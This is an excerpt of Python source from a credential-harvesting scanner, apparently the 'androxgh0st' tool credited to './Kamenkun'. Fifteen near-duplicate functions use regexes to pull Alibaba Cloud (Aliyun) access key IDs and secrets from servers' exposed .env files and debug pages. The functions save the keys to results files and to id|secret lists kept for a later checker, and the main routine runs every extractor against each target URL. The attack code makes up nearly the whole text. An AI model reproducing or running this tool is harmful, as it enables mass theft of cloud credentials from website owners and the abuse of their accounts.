...
class androxgh0st:
	...
	def get_aliyun1(self, text, url): 
		try:
			if "accessKeyId" in text:
				if "accessKeyId=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\naccessKeyId=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>accessKeyId</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>accessKeyId<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>accessKeySecret<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\naccessKeyId: '+str(accessKeyId)+'\naccessKeySecret: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN1.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('Results/forchecker/aliyun.txt','a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			else:
	...
	def get_aliyun2(self, text, url): 
		try:
			if "SMS_KEY_ID" in text:
				if "SMS_KEY_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nSMS_KEY_ID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>SMS_KEY_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>SMS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>SMS_KEY_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_KEY_ID: '+str(accessKeyId)+'\nSMS_KEY_SECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN2.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun3(self, text, url): 
		try:
			if "OSS_ACCESS_ID" in text:
				if "OSS_ACCESS_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nOSS_ACCESS_ID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>OSS_ACCESS_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>OSS_ACCESS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>OSS_ACCESS_KEYS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nOSS_ACCESS_ID: '+str(accessKeyId)+'\nOSS_ACCESS_KEYS: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN3.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun4(self, text, url): 
		try:
			if "ALI_OSS_ACCESS_ID" in text:
				if "ALI_OSS_ACCESS_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nALI_OSS_ACCESS_ID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>ALI_OSS_ACCESS_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALI_OSS_ACCESS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALI_OSS_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALI_OSS_ACCESS_ID: '+str(accessKeyId)+'\nALI_OSS_ACCESS_KEY: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN4.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun5(self, text, url): 
		try:
			if "SMS_ACCESS_KEY_ID" in text:
				if "SMS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nSMS_ACCESS_KEY_ID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>SMS_ACCESS_KEY_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>SMS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>SMS_ACCESS_KEY_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_ACCESS_KEY_ID: '+str(accessKeyId)+'\nSMS_ACCESS_KEY_SECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN5.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun6(self, text, url): 
		try:
			if "ALIYUN_SMS_AK" in text:
				if "ALIYUN_SMS_AK=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nALIYUN_SMS_AK=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>ALIYUN_SMS_AK</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALIYUN_SMS_AK<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALIYUN_SMS_AS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALIYUN_SMS_AK: '+str(accessKeyId)+'\nALIYUN_SMS_AS: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN6.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			if "AccessKeyId" in text:
				if "AccessKeyId=" in text:
					...
					try:
						...
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>AccessSecret<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAccessKeyId: '+str(accessKeyId)+'\nAccessSecret: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN7.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
	...
	def get_aliyun8(self, text, url): 
		try:
			if "OSS_ACCESS_ID" in text:
				if "OSS_ACCESS_ID=" in text:
					...
					try:
						...
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>OSS_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nOSS_ACCESS_ID: '+str(accessKeyId)+'\nOSS_ACCESS_KEY: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN8.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun9(self, text, url): 
		try:
			if "ALIYUN_ACCESS_KEY_ID" in text:
				if "ALIYUN_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>ALIYUN_ACCESS_KEY_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALIYUN_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALIYUN_ACCESS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALIYUN_ACCESS_KEY_ID: '+str(accessKeyId)+'\nALIYUN_ACCESS_SECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN9.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun10(self, text, url): 
		try:
			if "ALI_ACCESS_KEY" in text:
				if "ALI_ACCESS_KEY=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nALI_ACCESS_KEY=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>ALI_ACCESS_KEY</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALI_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALI_ACCESS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALI_ACCESS_KEY: '+str(accessKeyId)+'\nALI_ACCESS_SECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN10.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun11(self, text, url): 
		try:
			if "ALIYUN_ACCESSKEY_ID" in text:
				if "ALIYUN_ACCESSKEY_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nALIYUN_ACCESSKEY_ID=(.*?)\n', text)[0]
						...
						accessKeyId = ''
					try:
						accessKeySecret = reg('\nALIYUN_ACCESSKEY_KEY=(.*?)\n', text)[0]
					except:
						accessKeySecret = ''
				elif '<td>ALIYUN_ACCESSKEY_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALIYUN_ACCESSKEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALIYUN_ACCESSKEY_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALIYUN_ACCESSKEY_ID: '+str(accessKeyId)+'\nALIYUN_ACCESSKEY_KEY: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN11.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun12(self, text, url): 
		try:
			if "ALIYUN_ACCESS_ID" in text:
				if "ALIYUN_ACCESS_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nALIYUN_ACCESS_ID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>ALIYUN_ACCESS_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALIYUN_ACCESS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALIYUN_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALIYUN_ACCESS_ID: '+str(accessKeyId)+'\nALIYUN_ACCESS_KEY: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN12.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun13(self, text, url): 
		try:
			if "ALIYUN_ACCESSKEYID" in text:
				if "ALIYUN_ACCESSKEYID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nALIYUN_ACCESSKEYID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>ALIYUN_ACCESSKEYID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>ALIYUN_ACCESSKEYID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>ALIYUN_ACCESSKEYSECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nALIYUN_ACCESSKEYID: '+str(accessKeyId)+'\nALIYUN_ACCESSKEYSECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN13.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun14(self, text, url): 
		try:
			if "AL_ACCESS_KEY_ID" in text:
				if "SMS_KEY_ID=" in text:
					method = '/.env'
					try:
						accessKeyId = reg('\nAL_ACCESS_KEY_ID=(.*?)\n', text)[0]
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>AL_ACCESS_KEY_ID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>AL_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>AL_ACCESS_KEY_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAL_ACCESS_KEY_ID: '+str(accessKeyId)+'\nAL_ACCESS_KEY_SECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN14.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
			...
			return False
	def get_aliyun15(self, text, url): 
		try:
			if "SMS_ALIYUN_ACCESSKEYID" in text:
				if "SMS_ALIYUN_ACCESSKEYID=" in text:
					method = '/.env'
					try:
					...
					try:
						...
						accessKeySecret = ''
				elif '<td>SMS_ALIYUN_ACCESSKEYID</td>' in text:
					method = 'debug'
					try:
						accessKeyId = reg('<td>SMS_ALIYUN_ACCESSKEYID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeyId = ''
					try:
						accessKeySecret = reg('<td>SMS_ALIYUN_ACCESSKEYSECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						accessKeySecret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_ALIYUN_ACCESSKEYID: '+str(accessKeyId)+'\nSMS_ALIYUN_ACCESSKEYSECRET: '+str(accessKeySecret)
				remover = str(build).replace('\r', '')
				save = open('Results/ALIYUN15.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				build_forchecker = str(accessKeyId)+"|"+str(accessKeySecret)
				remover2 = str(build_forchecker).replace('\r', '')
...
def main(url):
	...
	try:
		...
		if resp:
			...
			getaliyun1 = androxgh0st().get_aliyun1(resp, url)
			getaliyun2 = androxgh0st().get_aliyun2(resp, url)
			getaliyun3 = androxgh0st().get_aliyun3(resp, url)
			getaliyun4 = androxgh0st().get_aliyun4(resp, url)
			getaliyun5 = androxgh0st().get_aliyun5(resp, url)
			getaliyun6 = androxgh0st().get_aliyun6(resp, url)
			getaliyun7 = androxgh0st().get_aliyun7(resp, url)
			getaliyun8 = androxgh0st().get_aliyun8(resp, url)
			getaliyun9 = androxgh0st().get_aliyun9(resp, url)
			getaliyun10 = androxgh0st().get_aliyun10(resp, url)
			getaliyun11 = androxgh0st().get_aliyun11(resp, url)
			getaliyun12 = androxgh0st().get_aliyun12(resp, url)
			getaliyun13 = androxgh0st().get_aliyun13(resp, url)
			getaliyun14 = androxgh0st().get_aliyun14(resp, url)
			getaliyun15 = androxgh0st().get_aliyun15(resp, url)
			...
			if getaliyun1:
				text += ' | \033[32;1mALIYUN1\033[0m'
			else:
				text += ' | \033[31;1mALIYUN1\033[0m'
			if getaliyun2:
				text += ' | \033[32;1mALIYUN2\033[0m'
			else:
				text += ' | \033[31;1mALIYUN2\033[0m'
			if getaliyun3:
				text += ' | \033[32;1mALIYUN3\033[0m'
			else:
				text += ' | \033[31;1mALIYUN3\033[0m'
			if getaliyun4:
				text += ' | \033[32;1mALIYUN4\033[0m'
			else:
				text += ' | \033[31;1mALIYUN4\033[0m'
			if getaliyun5:
				text += ' | \033[32;1mALIYUN5\033[0m'
			else:
				text += ' | \033[31;1mALIYUN5\033[0m'
			if getaliyun6:
				text += ' | \033[32;1mALIYUN6\033[0m'
			else:
				text += ' | \033[31;1mALIYUN6\033[0m'
			if getaliyun7:
				text += ' | \033[32;1mALIYUN7\033[0m'
			else:
				text += ' | \033[31;1mALIYUN7\033[0m'
			if getaliyun8:
				text += ' | \033[32;1mALIYUN8\033[0m'
			else:
				text += ' | \033[31;1mALIYUN8\033[0m'
			if getaliyun9:
				text += ' | \033[32;1mALIYUN9\033[0m'
			else:
				text += ' | \033[31;1mALIYUN9\033[0m'
			if getaliyun10:
				text += ' | \033[32;1mALIYUN10\033[0m'
			else:
				text += ' | \033[31;1mALIYUN10\033[0m'
			if getaliyun11:
				text += ' | \033[32;1mALIYUN11\033[0m'
			else:
				text += ' | \033[31;1mALIYUN11\033[0m'
			if getaliyun12:
				text += ' | \033[32;1mALIYUN12\033[0m'
			else:
				text += ' | \033[31;1mALIYUN12\033[0m'
			if getaliyun13:
				text += ' | \033[32;1mALIYUN13\033[0m'
			else:
				text += ' | \033[31;1mALIYUN13\033[0m'
			if getaliyun14:
				text += ' | \033[32;1mALIYUN14\033[0m'
			else:
				text += ' | \033[31;1mALIYUN14\033[0m'
			if getaliyun15:
				text += ' | \033[32;1mALIYUN15\033[0m'
			else:
				text += ' | \033[31;1mALIYUN15\033[0m'
			if getwtilio:
...
if __name__ == '__main__':
	print('''Made full with By ./Kamenkun - v2.1            
\n''')
	try:
